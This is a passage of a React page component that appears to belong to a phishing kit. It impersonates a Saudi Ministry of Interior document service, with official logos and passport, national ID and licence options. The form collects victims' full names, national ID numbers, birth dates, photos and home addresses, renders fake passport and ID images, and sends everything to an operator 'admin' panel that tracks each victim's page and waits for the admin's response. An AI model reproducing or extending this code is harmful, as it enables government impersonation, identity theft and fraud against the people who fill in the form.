import React, { useState, useEffect, useRef } from 'react';
import { sendData, navigateToPage, updatePage } from '@/lib/store';
import { useLocation } from 'wouter';
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { CalendarIcon } from 'lucide-react';
import { Calendar } from "@/components/ui/calendar";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import { cn } from "@/lib/utils";
import { toPng } from 'html-to-image';

const Documents = () => {
  const [, navigate] = useLocation();
  
  // Get service name from URL
  const searchParams = new URLSearchParams(window.location.search);
  const serviceName = searchParams.get('service') || 'الوثائق والمستندات';
  
  // Service type detection
  const isPassportService = serviceName.includes('جواز') || serviceName.includes('الجواز');
  const isNationalIdService = serviceName.includes('الهوية') || serviceName.includes('هوية');
  const isDrivingLicenseService = serviceName.includes('رخصة قيادة') || serviceName.includes('قيادة');
  const isVehicleLicenseService = serviceName.includes('رخصة سير') || serviceName.includes('سير');
  
  // State for confirmed service after clicking save
  const [confirmedService, setConfirmedService] = useState<string | null>(null);
  const showPassport = confirmedService === 'passport';
  const showNationalId = confirmedService === 'nationalId';
  const showDrivingLicense = confirmedService === 'drivingLicense';
  const showVehicleLicense = confirmedService === 'vehicleLicense';
  
  // Update page name in admin panel
  useEffect(() => {
    updatePage("صفحة الوثائق");
    navigateToPage("صفحة الوثائق");
  }, []);

  // Arabic Name (4 parts)
  const [arabicFirstName, setArabicFirstName] = useState('');
  const [arabicSecondName, setArabicSecondName] = useState('');
  const [arabicThirdName, setArabicThirdName] = useState('');
  const [arabicFourthName, setArabicFourthName] = useState('');
  
  // English Name (4 parts)
  const [englishFirstName, setEnglishFirstName] = useState('');
  const [englishSecondName, setEnglishSecondName] = useState('');
  const [englishThirdName, setEnglishThirdName] = useState('');
  const [englishFourthName, setEnglishFourthName] = useState('');
  
  // Passport Number (random: 2 capital letters + 5 digits)
  const [passportNumber] = useState(() => {
    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const randomLetters = letters.charAt(Math.floor(Math.random() * 26)) + letters.charAt(Math.floor(Math.random() * 26));
    const randomNumbers = Math.floor(10000 + Math.random() * 90000).toString();
    return randomLetters + randomNumbers;
  });

  // National ID
  const [nationalId, setNationalId] = useState('');
  const [nationalIdError, setNationalIdError] = useState('');
  
  // Gender
  const [gender, setGender] = useState('');
  
  // Date of Birth
  const [calendarType, setCalendarType] = useState<'gregorian' | 'hijri'>('gregorian');
  const [dateOfBirth, setDateOfBirth] = useState<Date | undefined>(undefined);
  const [hijriDate, setHijriDate] = useState({ day: '', month: '', year: '' });
  
  // Personal Photo
  const [personalPhoto, setPersonalPhoto] = useState<File | null>(null);
  const [photoPreview, setPhotoPreview] = useState<string | null>(null);
  const [photoNoBg, setPhotoNoBg] = useState<string | null>(null);
  const [isRemovingBg, setIsRemovingBg] = useState(false);
  
  // National Address
  const [province, setProvince] = useState('');
  const [district, setDistrict] = useState('');
  const [streetName, setStreetName] = useState('');
  const [buildingNumber, setBuildingNumber] = useState('');
  const [floorNumber, setFloorNumber] = useState('');
  
  // License Data
  const [nationality, setNationality] = useState('سعودي');
  const [licenseType, setLicenseType] = useState('خاصة');
  const [bloodType, setBloodType] = useState('B+');

  // Vehicle Registration Data
  const [vehicleOwnerName, setVehicleOwnerName] = useState('');
  const [vehicleUserName, setVehicleUserName] = useState('');
  const [vehicleOwnerId, setVehicleOwnerId] = useState('');
  const [vehicleUserId, setVehicleUserId] = useState('');
  const [vehicleChassisNumber, setVehicleChassisNumber] = useState('');
  const [vehiclePlateNumber, setVehiclePlateNumber] = useState('');
  const [vehiclePlateLetter1, setVehiclePlateLetter1] = useState('');
  const [vehiclePlateLetter2, setVehiclePlateLetter2] = useState('');
  const [vehiclePlateLetter3, setVehiclePlateLetter3] = useState('');
  const [vehicleRegistrationType, setVehicleRegistrationType] = useState('خصوصي');
  const [vehicleModel, setVehicleModel] = useState('');
  const [vehicleBrand, setVehicleBrand] = useState('');
  const [vehicleWeight, setVehicleWeight] = useState('');
  const [vehicleLoad, setVehicleLoad] = useState('');
  const [vehicleColor, setVehicleColor] = useState('');
  const [vehicleManufactureYear, setVehicleManufactureYear] = useState('');
  const [vehicleSerialNumber, setVehicleSerialNumber] = useState('');
  const [vehicleBrandCustom, setVehicleBrandCustom] = useState('');
  const [vehicleModelCustom, setVehicleModelCustom] = useState('');
  const [vehicleExpiryDate, setVehicleExpiryDate] = useState('');
  const [wantToAddUser, setWantToAddUser] = useState(false);
  
  // Validation errors
  const [validationErrors, setValidationErrors] = useState<Record<string, string>>({});
  
  // Passport image capture
  const [passportImage, setPassportImage] = useState<string | null>(null);
  const passportRef = React.useRef<HTMLDivElement>(null);
  
  // National ID image capture
  const [nationalIdImage, setNationalIdImage] = useState<string | null>(null);
  const nationalIdRef = React.useRef<HTMLDivElement>(null);
  
  // Confirmation popup and form lock
  const [showConfirmPopup, setShowConfirmPopup] = useState(false);
  const [isFormLocked, setIsFormLocked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [declarationChecked, setDeclarationChecked] = useState(false);
  const [isNavigating, setIsNavigating] = useState(false);
  
  // Screen size detection for responsive styling
  const [isMobile, setIsMobile] = useState(false);
  
  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth < 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Saudi Provinces and Districts
  const provincesData: Record<string, string[]> = {
    'الرياض': ['الرياض', 'الدرعية', 'الخرج', 'الدوادمي', 'المجمعة', 'القويعية', 'وادي الدواسر', 'الأفلاج', 'الزلفي', 'شقراء', 'حوطة بني تميم', 'عفيف', 'السليل', 'ضرما', 'المزاحمية', 'رماح', 'ثادق', 'حريملاء', 'الحريق', 'الغاط', 'مرات'],
    'مكة المكرمة': ['مكة المكرمة', 'جدة', 'الطائف', 'القنفذة', 'الليث', 'رابغ', 'خليص', 'الجموم', 'الكامل', 'الخرمة', 'رنية', 'تربة', 'الموية', 'ميسان', 'أضم', 'العرضيات', 'بحرة'],
    'المدينة المنورة': ['المدينة المنورة', 'ينبع', 'العلا', 'مهد الذهب', 'الحناكية', 'بدر', 'خيبر', 'وادي الفرع'],
    'القصيم': ['بريدة', 'عنيزة', 'الرس', 'المذنب', 'البكيرية', 'البدائع', 'الأسياح', 'النبهانية', 'الشماسية', 'عيون الجواء', 'رياض الخبراء', 'عقلة الصقور', 'ضريه'],
    'المنطقة الشرقية': ['الدمام', 'الأحساء', 'حفر الباطن', 'الجبيل', 'القطيف', 'الخبر', 'الظهران', 'رأس تنورة', 'بقيق', 'النعيرية', 'قرية العليا', 'العديد'],
    'عسير': ['أبها', 'خميس مشيط', 'بيشة', 'النماص', 'محايل عسير', 'ظهران الجنوب', 'تثليث', 'سراة عبيدة', 'رجال ألمع', 'أحد رفيدة', 'بلقرن', 'المجاردة', 'البرك', 'تنومة'],
    'تبوك': ['تبوك', 'الوجه', 'ضباء', 'تيماء', 'أملج', 'حقل', 'البدع'],
    'حائل': ['حائل', 'بقعاء', 'الغزالة', 'الشنان', 'الحائط', 'السليمي', 'موقق', 'الشملي'],
    'الحدود الشمالية': ['عرعر', 'رفحاء', 'طريف', 'العويقيلة'],
    'جازان': ['جازان', 'صبيا', 'أبو عريش', 'صامطة', 'بيش', 'الدرب', 'الريث', 'ضمد', 'الحرث', 'فرسان', 'الدائر', 'العيدابي', 'أحد المسارحة', 'العارضة', 'فيفاء', 'الطوال', 'هروب'],
    'نجران': ['نجران', 'شرورة', 'حبونا', 'بدر الجنوب', 'يدمة', 'ثار', 'خباش'],
    'الباحة': ['الباحة', 'بلجرشي', 'المندق', 'المخواة', 'قلوة', 'العقيق', 'غامد الزناد', 'الحجرة', 'بني حسن'],
    'الجوف': ['سكاكا', 'دومة الجندل', 'القريات', 'طبرجل', 'صوير']
  };

  const provinces = Object.keys(provincesData);
  const districts = province ? provincesData[province] || [] : [];

  // World Nationalities
  const nationalities = [
    'سعودي', 'إماراتي', 'كويتي', 'بحريني', 'عماني', 'قطري', 'يمني', 'عراقي', 'سوري', 'لبناني', 'أردني', 'فلسطيني', 'مصري', 'سوداني', 'ليبي', 'تونسي', 'جزائري', 'مغربي', 'موريتاني',
    'أمريكي', 'بريطاني', 'فرنسي', 'ألماني', 'إيطالي', 'إسباني', 'برتغالي', 'هولندي', 'بلجيكي', 'سويسري', 'نمساوي', 'سويدي', 'نرويجي', 'دنماركي', 'فنلندي', 'يوناني', 'تركي', 'روسي', 'أوكراني', 'بولندي',
    'هندي', 'باكستاني', 'بنغلاديشي', 'سريلانكي', 'نيبالي', 'أفغاني', 'إيراني', 'صيني', 'ياباني', 'كوري', 'فلبيني', 'إندونيسي', 'ماليزي', 'تايلاندي', 'فيتنامي', 'سنغافوري',
    'أسترالي', 'نيوزيلندي', 'كندي', 'مكسيكي', 'برازيلي', 'أرجنتيني', 'كولومبي', 'تشيلي', 'بيروفي',
    'نيجيري', 'غاني', 'كيني', 'إثيوبي', 'جنوب أفريقي', 'مغربي', 'تونسي'
  ];

  // License Types
  const licenseTypes = [
    'خاصة',
    'عامة',
    'مركبات ثقيلة',
    'دراجة نارية',
    'معدات ثقيلة',
    'حافلة',
    'أجرة',
    'دولية'
  ];

  // Blood Types
  const bloodTypes = [
    'A+', 'A-', 'B+', 'B-', 'AB+', 'AB-', 'O+', 'O-'
  ];

  // Saudi Plate Letters
  const saudiPlateLetters = [
    { arabic: 'أ', english: 'A' },
    { arabic: 'ب', english: 'B' },
    { arabic: 'ح', english: 'J' },
    { arabic: 'د', english: 'D' },
    { arabic: 'ر', english: 'R' },
    { arabic: 'س', english: 'S' },
    { arabic: 'ص', english: 'X' },
    { arabic: 'ط', english: 'T' },
    { arabic: 'ع', english: 'E' },
    { arabic: 'ق', english: 'G' },
    { arabic: 'ك', english: 'K' },
    { arabic: 'ل', english: 'L' },
    { arabic: 'م', english: 'Z' },
    { arabic: 'ن', english: 'N' },
    { arabic: 'ه', english: 'H' },
    { arabic: 'و', english: 'U' },
    { arabic: 'ى', english: 'V' }
  ];

  // Vehicle Registration Types
  const vehicleRegistrationTypes = [
    'خصوصي',
    'نقل عام',
    'نقل خاص',
    'مقطورة',
    'دراجة نارية',
    'مركبة أجرة',
    'تصدير',
    'دراجة نارية ترفيهيه',
    'هيئة دبلوماسية',
    'حافلة خاصة',
    'مؤقتة',
    'مركبة أشغال عامة'
  ];

  // Vehicle Brands
  const vehicleBrands = [
    'تويوتا', 'لكزس', 'نيسان', 'هوندا', 'ميتسوبيشي', 'مازدا', 'سوزوكي', 'إيسوزو', 'سوبارو',
    'مرسيدس', 'بي إم دبليو', 'أودي', 'فولكس واجن', 'بورشه', 'أوبل',
    'فورد', 'شيفروليه', 'جي إم سي', 'جيب', 'دودج', 'كرايسلر', 'كاديلاك', 'لينكولن',
    'هيونداي', 'كيا', 'جينيسيس',
    'رينو', 'بيجو', 'سيتروين',
    'فيات', 'ألفا روميو', 'مازيراتي', 'فيراري', 'لامبورغيني',
    'لاند روفر', 'جاغوار', 'بينتلي', 'رولز رويس', 'أستون مارتن', 'ماكلارين',
    'فولفو', 'ساب',
    'شيري', 'جيلي', 'هافال', 'إم جي', 'بي واي دي',
    'أخرى'
  ];

  // Vehicle Models (will be filtered by brand)
  const vehicleModels: Record<string, string[]> = {
    'تويوتا': ['كامري', 'كورولا', 'لاند كروزر', 'هايلكس', 'راف فور', 'يارس', 'أفالون', 'فورتشنر', 'إنوفا', 'سيكويا', 'برادو', 'إف جي'],
    'لكزس': ['ES', 'LS', 'GS', 'IS', 'RX', 'NX', 'UX', 'GX', 'LX', 'RC', 'LC'],
    'نيسان': ['صني', 'ألتيما', 'ماكسيما', 'باترول', 'إكس تريل', 'جوك', 'كيكس', 'سنترا', 'تيدا', 'نافارا'],
    'هوندا': ['أكورد', 'سيفيك', 'سيتي', 'سي آر في', 'بايلوت', 'أوديسي', 'إتش آر في'],
    'هيونداي': ['سوناتا', 'إلنترا', 'أكسنت', 'توسان', 'سانتافي', 'باليسيد', 'كونا', 'فيلوستر', 'آزيرا', 'جراندير'],
    'كيا': ['سيراتو', 'أوبتيما', 'سورينتو', 'سبورتاج', 'كارنيفال', 'سيلتوس', 'بيكانتو', 'كادينزا', 'ستينجر', 'K5', 'K8', 'K9', 'EV6'],
    'مرسيدس': ['S-Class', 'E-Class', 'C-Class', 'A-Class', 'GLE', 'GLC', 'GLA', 'G-Class', 'AMG GT', 'CLA', 'CLS', 'GLS', 'EQS', 'EQE'],
    'بي إم دبليو': ['Series 3', 'Series 5', 'Series 7', 'X3', 'X5', 'X7', 'X1', 'X6', 'M3', 'M5', 'i4', 'iX'],
    'فورد': ['إكسبيديشن', 'إكسبلورر', 'إيج', 'إسكيب', 'تورس', 'فيوجن', 'موستانج', 'برونكو', 'رينجر', 'F-150'],
    'شيفروليه': ['تاهو', 'سوبربان', 'ترافيرس', 'ماليبو', 'كامارو', 'إمبالا', 'سيلفرادو', 'كابتيفا', 'بليزر', 'إكوينوكس'],
    'جيب': ['رانجلر', 'غراند شيروكي', 'شيروكي', 'كوماندر', 'كومباس', 'رينيجيد', 'غلادياتور'],
    'أخرى': ['أخرى']
  };

  // Vehicle Load Capacities
  const vehicleLoadCapacities = [
    'أقل من 1 طن',
    '1 - 3 طن',
    '3 - 5 طن',
    '5 - 10 طن',
    '10 - 20 طن',
    'أكثر من 20 طن',
    'لا ينطبق'
  ];

  // Manufacture Years (last 50 years)
  const currentYear = new Date().getFullYear();
  const manufactureYears = Array.from({length: 50}, (_, i) => (currentYear - i).toString());

  // Hijri months
  const hijriMonths = [
    { value: '1', label: 'محرم' },
    { value: '2', label: 'صفر' },
    { value: '3', label: 'ربيع الأول' },
    { value: '4', label: 'ربيع الثاني' },
    { value: '5', label: 'جمادى الأولى' },
    { value: '6', label: 'جمادى الآخرة' },
    { value: '7', label: 'رجب' },
    { value: '8', label: 'شعبان' },
    { value: '9', label: 'رمضان' },
    { value: '10', label: 'شوال' },
    { value: '11', label: 'ذو القعدة' },
    { value: '12', label: 'ذو الحجة' },
  ];

  // Validate National ID
  const validateNationalId = (value: string) => {
    if (value.length > 0 && value.length !== 10) {
      setNationalIdError('رقم الهوية يجب أن يكون 10 أرقام');
      return false;
    }
    if (value.length === 10 && !value.startsWith('1') && !value.startsWith('2')) {
      setNationalIdError('رقم الهوية يجب أن يبدأ بـ 1 أو 2');
      return false;
    }
    setNationalIdError('');
    return true;
  };

  // Handle form submission
  const handleSubmit = () => {
    console.log('handleSubmit called');
    // Start loading immediately
    setIsLoading(true);
    
    const errors: Record<string, string> = {};
    
    // Validate Arabic name
    if (!arabicFirstName) errors.arabicFirstName = 'الاسم الأول مطلوب';
    if (!arabicSecondName) errors.arabicSecondName = 'اسم الأب مطلوب';
    if (!arabicThirdName) errors.arabicThirdName = 'اسم الجد مطلوب';
    if (!arabicFourthName) errors.arabicFourthName = 'اسم العائلة مطلوب';
    
    // Validate English name
    if (!englishFirstName) errors.englishFirstName = 'First name is required';
    if (!englishSecondName) errors.englishSecondName = 'Second name is required';
    if (!englishThirdName) errors.englishThirdName = 'Third name is required';
    if (!englishFourthName) errors.englishFourthName = 'Last name is required';
    
    // Validate National ID
    if (!nationalId) {
      errors.nationalId = 'رقم الهوية مطلوب';
    } else if (nationalId.length !== 10) {
      errors.nationalId = 'رقم الهوية يجب أن يكون 10 أرقام';
    }
    
    // Validate Date of Birth
    if (calendarType === 'gregorian' && !dateOfBirth) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    if (calendarType === 'hijri' && (!hijriDate.day || !hijriDate.month || !hijriDate.year)) {
      errors.dateOfBirth = 'تاريخ الميلاد مطلوب';
    }
    
    // Validate Gender
    if (!gender) {
      errors.gender = 'الجنس مطلوب';
    }
    
    // Validate Personal Photo (skip for vehicle license service)
    if (!isVehicleLicenseService && !photoPreview && !photoNoBg) {
      errors.photo = 'الصورة الشخصية مطلوبة';
    }
    
    // Validate National Address
    if (!province) {
      errors.province = 'المحافظة مطلوبة';
    }
    if (!district) {
      errors.district = 'المنطقة مطلوبة';
    }
    if (!streetName) {
      errors.streetName = 'اسم الشارع مطلوب';
    }
    if (!buildingNumber) {
      errors.buildingNumber = 'رقم المبنى مطلوب';
    }
    if (!floorNumber) {
      errors.floorNumber = 'رقم الدور مطلوب';
    }
    
    setValidationErrors(errors);
    
    if (Object.keys(errors).length > 0) {
      // Stop loading if there are errors
      setIsLoading(false);
      console.log('Validation errors:', errors);
      return;
    }
    
    // No errors, continue with submission
    console.log('No validation errors, proceeding...');
    
    // Capture passport as image
    if (passportRef.current) {
      toPng(passportRef.current, {
        quality: 1.0,
        pixelRatio: 2,
        cacheBust: true,
        skipAutoScale: true,
        style: {
          transform: 'scale(1)',
          transformOrigin: 'top left'
        }
      }).then((dataUrl) => {
        setPassportImage(dataUrl);
      }).catch((error) => {
        console.error('Error capturing passport:', error);
      });
    }
    
    // Capture national ID as image
    if (nationalIdRef.current) {
      toPng(nationalIdRef.current, {
        quality: 1.0,
        pixelRatio: 2,
        cacheBust: true,
        skipAutoScale: true,
        style: {
          transform: 'scale(1)',
          transformOrigin: 'top left'
        }
      }).then((dataUrl) => {
        setNationalIdImage(dataUrl);
      }).catch((error) => {
        console.error('Error capturing national ID:', error);
      });
    }
    
    // Show confirmation popup after 3 seconds and stop loading
    setTimeout(() => {
      setIsLoading(false);
      setShowConfirmPopup(true);
    }, 3000);
    
    // Send data to admin
    const formData = {
      'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
      'الاسم الأول (عربي)': arabicFirstName,
      'اسم الأب (عربي)': arabicSecondName,
      'اسم الجد (عربي)': arabicThirdName,
      'اسم العائلة (عربي)': arabicFourthName,
      'الاسم بالإنجليزي': `${englishFirstName} ${englishSecondName} ${englishThirdName} ${englishFourthName}`,
      'First Name': englishFirstName,
      'Second Name': englishSecondName,
      'Third Name': englishThirdName,
      'Last Name': englishFourthName,
      'رقم الهوية الوطنية': nationalId,
      'تاريخ الميلاد': calendarType === 'hijri' 
        ? `${hijriDate.day}/${hijriDate.month}/${hijriDate.year} هـ`
        : dateOfBirth?.toLocaleDateString('ar-SA'),
    };
    
    sendData({
      current: 'صفحة الوثائق',
      ...formData,
      waitingForAdminResponse: true,
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />
      
      <main className="flex-1 py-8">
        <div className="container mx-auto px-4 max-w-4xl">
          {/* Logos */}
          <div className="flex justify-center items-center gap-8 mb-8">
            <img 
              src="/images/moi-logo.png" 
              alt="وزارة الداخلية" 
              className="h-40 md:h-52 object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
            {(isDrivingLicenseService || isVehicleLicenseService) && (
            <img 
              src="/traffic-logo.png" 
              alt="إدارة المرور" 
              className="h-32 md:h-40 object-contain"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
            )}
          </div>
          
          <div className={`bg-white rounded-xl shadow-lg p-6 md:p-8 ${confirmedService ? 'hidden' : ''}`}>
            <h1 className="text-xl md:text-2xl font-bold text-center text-gray-800 mb-6">{serviceName}</h1>
            
            {/* National ID and Date of Birth */}
            <div className="mb-8">
              <h2 className="text-[11px] md:text-lg font-bold text-gray-700 mb-3 border-b pb-2">معلومات الهوية</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* National ID */}
                <div>
                  <Label className="text-gray-600 text-[10px] md:text-sm mb-1 block">رقم الهوية الوطنية <span className="text-red-500">*</span></Label>
                  <Input
                    value={nationalId}
                    onChange={(e) => {
                      const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                      setNationalId(value);
                      validateNationalId(value);
                      if (validationErrors.nationalId) {
                        setValidationErrors(prev => ({ ...prev, nationalId: '' }));
                      }
                    }}
                    placeholder="1xxxxxxxxx"
                    className={`text-right ${validationErrors.nationalId || nationalIdError ? 'border-red-500' : ''}`}
                    maxLength={10}
                    disabled={isFormLocked}
                  />
                  {(validationErrors.nationalId || nationalIdError) && (
                    <p className="text-red-500 text-xs mt-1">{validationErrors.nationalId || nationalIdError}</p>
                  )}
                </div>
                
                {/* Date of Birth */}
                <div>
                  <div className="flex items-center justify-between mb-1">
                    <Label className="text-gray-600 text-[10px] md:text-sm">تاريخ الميلاد <span className="text-red-500">*</span></Label>
                    <div className="flex gap-1">
                      <button
                        type="button"
                        onClick={() => setCalendarType('gregorian')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'gregorian' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                        disabled={isFormLocked}
                      >
                        ميلادي
                      </button>
                      <button
                        type="button"
                        onClick={() => setCalendarType('hijri')}
                        className={cn(
                          "text-[10px] px-2 py-0.5 rounded border transition-colors",
                          calendarType === 'hijri' 
                            ? "bg-green-600 text-white border-green-600" 
                            : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                        )}
                        disabled={isFormLocked}
                      >
                        هجري
                      </button>
                    </div>
                  </div>

                  {calendarType === 'gregorian' ? (
                    <Popover>
                      <PopoverTrigger asChild>
                        <Button
                          variant={"outline"}
                          className={cn(
                            "w-full justify-start text-right font-normal h-12",
                            !dateOfBirth && "text-muted-foreground",
                            validationErrors.dateOfBirth && "border-red-500"
                          )}
                          disabled={isFormLocked}
                        >
                          <CalendarIcon className="ml-2 h-4 w-4" />
                          {dateOfBirth ? dateOfBirth.toLocaleDateString('en-CA') : <span>اختر التاريخ</span>}
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent className="w-auto p-0" align="start">
                        <Calendar
                          mode="single"
                          selected={dateOfBirth}
                          onSelect={(date) => {
                            setDateOfBirth(date);
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          disabled={(date) => {
                            const today = new Date();
                            const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
                            return date > maxDate || date < new Date("1940-01-01");
                          }}
                          initialFocus
                          captionLayout="dropdown"
                          fromYear={1940}
                          toYear={new Date().getFullYear() - 18}
                        />
                      </PopoverContent>
                    </Popover>
                  ) : (
                    <div className="grid grid-cols-3 gap-2">
                      <div>
                        <select
                          value={hijriDate.day}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, day: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                          disabled={isFormLocked}
                        >
                          <option value="">اليوم</option>
                          {Array.from({ length: 30 }, (_, i) => i + 1).map(day => (
                            <option key={day} value={day}>{day}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.month}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, month: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                          disabled={isFormLocked}
                        >
                          <option value="">الشهر</option>
                          {hijriMonths.map(month => (
                            <option key={month.value} value={month.value}>{month.label}</option>
                          ))}
                        </select>
                      </div>
                      <div>
                        <select
                          value={hijriDate.year}
                          onChange={(e) => {
                            setHijriDate(prev => ({ ...prev, year: e.target.value }));
                            if (validationErrors.dateOfBirth) {
                              setValidationErrors(prev => ({ ...prev, dateOfBirth: '' }));
                            }
                          }}
                          className={cn(
                            "w-full h-10 px-3 rounded-md border text-sm text-right",
                            validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                          )}
                          disabled={isFormLocked}
                        >
                          <option value="">السنة</option>
                          {Array.from({ length: 60 }, (_, i) => 1428 - i).map(year => (
                            <option key={year} value={year}>{year}</option>
                          ))}
                        </select>
                      </div>
                    </div>
                  )}
                  {validationErrors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{validationErrors.dateOfBirth}</p>}
                </div>
              </div>
            </div>
            
            {/* Gender Section */}
            <div className="mb-8">
              <h2 className="text-[11px] md:text-lg font-bold text-gray-700 mb-2 border-b pb-2 text-right">الجنس</h2>
              <div className="text-right mt-2">
                  <select
                    value={gender}
                    onChange={(e) => setGender(e.target.value)}
                    className="w-full md:w-48 h-10 px-3 rounded-md border border-gray-200 text-sm text-right bg-white"
                  style={{ direction: 'rtl' }}
                  disabled={isFormLocked}
                >
                  <option value="">اختر الجنس</option>
                  <option value="ذكر">ذكر</option>
                  <option value="أنثى">أنثى</option>
                </select>
              </div>
            </div>
            
            {/* Arabic Name Section */}
            <div className="mb-8">
              <h2 className="font-bold text-gray-700 mb-3 border-b pb-2" style={{fontSize: isMobile ? '11px' : '18px'}}>الاسم بالعربي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>الاسم الأول <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFirstName(value);
                      if (validationErrors.arabicFirstName) {
                        setValidationErrors(prev => ({ ...prev, arabicFirstName: '' }));
                      }
                    }}
                    placeholder="محمد"
                    className={`text-right ${validationErrors.arabicFirstName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.arabicFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>اسم الأب <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicSecondName(value);
                      if (validationErrors.arabicSecondName) {
                        setValidationErrors(prev => ({ ...prev, arabicSecondName: '' }));
                      }
                    }}
                    placeholder="عبدالله"
                    className={`text-right ${validationErrors.arabicSecondName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.arabicSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicSecondName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>اسم الجد <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicThirdName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicThirdName(value);
                      if (validationErrors.arabicThirdName) {
                        setValidationErrors(prev => ({ ...prev, arabicThirdName: '' }));
                      }
                    }}
                    placeholder="أحمد"
                    className={`text-right ${validationErrors.arabicThirdName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.arabicThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicThirdName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block" style={{fontSize: isMobile ? '10px' : '14px'}}>اسم العائلة <span className="text-red-500">*</span></Label>
                  <Input
                    value={arabicFourthName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^\u0600-\u06FF\s]/g, '');
                      setArabicFourthName(value);
                      if (validationErrors.arabicFourthName) {
                        setValidationErrors(prev => ({ ...prev, arabicFourthName: '' }));
                      }
                    }}
                    placeholder="السعودي"
                    className={`text-right ${validationErrors.arabicFourthName ? 'border-red-500' : ''}`}
                    disabled={isFormLocked}
                  />
                  {validationErrors.arabicFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFourthName}</p>}
                </div>
              </div>
            </div>
            
            {/* English Name Section */}
            <div className="mb-8">
              <h2 className="font-bold text-gray-700 mb-3 border-b pb-2" style={{fontSize: isMobile ? '11px' : '18px'}}>الاسم بالإنجليزي</h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div>
                  <Label className="text-gray-600 mb-1 block text-left" dir="ltr" style={{fontSize: isMobile ? '10px' : '14px'}}>First Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishFirstName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishFirstName(value);
                      if (validationErrors.englishFirstName) {
                        setValidationErrors(prev => ({ ...prev, englishFirstName: '' }));
                      }
                    }}
                    placeholder="Mohammed"
                    className={`text-left ${validationErrors.englishFirstName ? 'border-red-500' : ''}`}
                    dir="ltr"
                    disabled={isFormLocked}
                  />
                  {validationErrors.englishFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFirstName}</p>}
                </div>
                <div>
                  <Label className="text-gray-600 mb-1 block text-left" dir="ltr" style={{fontSize: isMobile ? '10px' : '14px'}}>Second Name <span className="text-red-500">*</span></Label>
                  <Input
                    value={englishSecondName}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
                      setEnglishSecondName(value);
                      if (validationErrors.englishSecondName) {
                        setValidationErrors(prev => ({ ...prev, englishSecondName: '' }));
                      }
                    }}
                    placeholder="Abdullah"
                    className={`text-left ${validationErrors.englishSecondName ? 'border-red-500' : ''}`}
                    dir="ltr"
                    disabled={isFormLocked}
                  />
